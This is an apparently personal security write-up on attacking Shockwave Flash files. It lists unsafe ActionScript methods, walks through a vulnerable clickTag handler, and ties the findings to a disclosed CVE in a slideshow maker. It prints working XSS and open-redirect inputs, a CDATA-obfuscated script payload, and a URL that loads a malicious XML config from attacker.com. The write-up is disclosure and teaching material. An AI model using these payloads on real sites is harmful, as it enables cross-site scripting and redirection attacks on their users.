<p>#[DESCRIPTIVE REFERENCE] :</p>
Flash player related vulnerabilities have been notorious in their susceptibility to a vast range of attacks over time. When performing an offensive engagement, whether it's through consultancy, or through external responsible disclosure programs, it is highly recommended that analysis of any Shockwave Flash (SWF) file be performed. While many haven't explored such an attack path, this is a widely known issue.
As opposed to deep diving into flash exploitation and the various attack vectors. This article will be focusing on a more generic overview prior to presenting my own findings as a reminder as to how Shockwave Flash (SWF) files can pose a threat, their capabilities and the potential attack path associated with the insecure variations being hosted and exposed to the public domain.
SWF files are created through ActionScript syntax, of which, is very similar to JavaScript as both conform to the ECMA-based syntax. Like any other language, failure to properly validate and sanitize user inputs can leave the segment vulnerable to various attacks. Furthermore, ActionScript itself, contains vulnerabilities associated with it, itself, this includes methods rendered ‘unsafe’, such as, but not limited to:
<p>#[VULNERABLE ACTIONSCRIPT METHODS] :</p>
<pre class="hack dark"><i>
externalInterface.call(); 
getURL();
loadVariables();
navigateToURL();
loadMovieVar();
loadMovieNum();
LoadVars.load;
LoadVars.send;
 XML.load ( 'url' ); 
XML.sendAndLoad ( 'url' ); 
LoadVars.load ( 'url' );
LoadVars.send ( 'url' ); 
flash.external.ExternalInterface.call(_root.callback);
externalInterface.addCallback;
AddDLL;
etc..
</pre>

<p>#[INSECURE GLOBAL VARIABLES] :</p>
<pre class="hack dark"><i>
_root, _global, _level0</i>
</pre>
In terms of performing the analysis, SWF files can be decompiled through various tools, a common one being flare. Therefore, exploitation is handled in a white-box mannered approach. Once decompiled a source code analysis can be initiated. There are tools out their which can perform a static-code analysis in an automated manner, however, they often miss many insecurities. Therefore, it is recommended that a more manual approach be taken. Since ActionScript is a straight forward language, only basic knowledge of its structure, methods and syntax is required.

The main objective with the code analysis is to get an overview of the code flow, how variables are handled and if possible, how to manipulate such variables. For example, look for lack of input sanitization, undefined flashvars, use of the mentioned insecure global variables and method calls. If any of the above global variables are declared but remain undefined, then it is likely that the SWF will be vulnerable.

For example, see a vulnerable decompiled source below:
<pre class="hack dark"><i>
button 48 {
	on (release) {
		var str = (_level0.clickTag != undefined) ? _level0.clickTag
			getURL(str, '');
	}
   }</i>
</pre>
The above illustrates a vulnerability pertinent to the clickTag flashvar. During an analysis, it was discovered that this 'clickTag' variable is associated with the release of button 48, note the use of the global var, _level0. This button was mapped to the entire flash movie. Meaning, that the value stored within this flashvar is called strictly upon the condition of the victim clicking anywhere on the movie itself. Therefore, in this case, the vulnerability does require a form of social interaction for its successful exploitation, as the user is required to click on the flash movie to trigger the exploit.

In the case of the above scenario, the clickTag flashvar was initially declared to serve a purpose of re-directing a user to an informative page segment within the HTTP content. However, due to the lack of variable definition, as well as, lack of input sanitization, use of the unsafe GetURL() method, and incorporation of the insecure _level0 global variable; An attacker is able to control the behaviour of the vulnerable variable in question. This is achieved by assigning malicious values to that var and have it called via GET. Such vulnerabilities that could exist within Shockwave Flash files includes; SOME attacks, Content Forgery, Unvalidated Redirects, as well as, XSS, thus allowing an attacker to execute malicious client-side scripts.

The above example can be exploited via:
<pre class="hack dark">
?clickTag=javascript:confirm(document.domain); or ?clickTag=//ret2eax.pw
</pre>
In terms of exploiting such vulnerabilities through a cross-domain approach, some vendors incorporate an XML config file to control the behaviour of the SWF. Therefore, these SWF files may have a dynamic flashvar pointing to a config file on the same server the SWF is hosted on. However, if this flashvar can be controlled by the attacker externally, with a correct cross-domain policy configured on the attacking server, all that is required is to remotely call a malicious XML variation (hosted on an attacker’s server), which in turn, will include the instructions to control the SWF, thus determining its behaviour. The attack vectors associated with this method of exploitation remains similar as to that of the above, however, the methods slightly vary. For example, an XSS payload is incorporated within an XML entity either as a variable’s value, or included in an arbitrary sense through the malicious XML via the use of CDATA:

<p>#[EXPLOITING VULNERABLE XML CONFIGURATIONS THROUGH CDATA] :</p>
<pre class="hack dark">
&lt;![CDATA[<]]>script&lt;![CDATA[>]]>alert('xss')&lt;![CDATA[<]]>/script&lt;![CDATA[>]]>
</pre>

This would then be called in the manner of:
	http://example.com/swf/example.swf?xml_path=//attacker.com/poc.xml

I identified this issue within many SWF generators and slideshow makers, including that of a Windows application titled Flash Slideshow Maker Professional, with version 5.20 and below being vulnerable in the way they handle 'advanced' file behaviour. See <a href="cve-2017-12439.html">CVE-2017-12439</a> for more information.
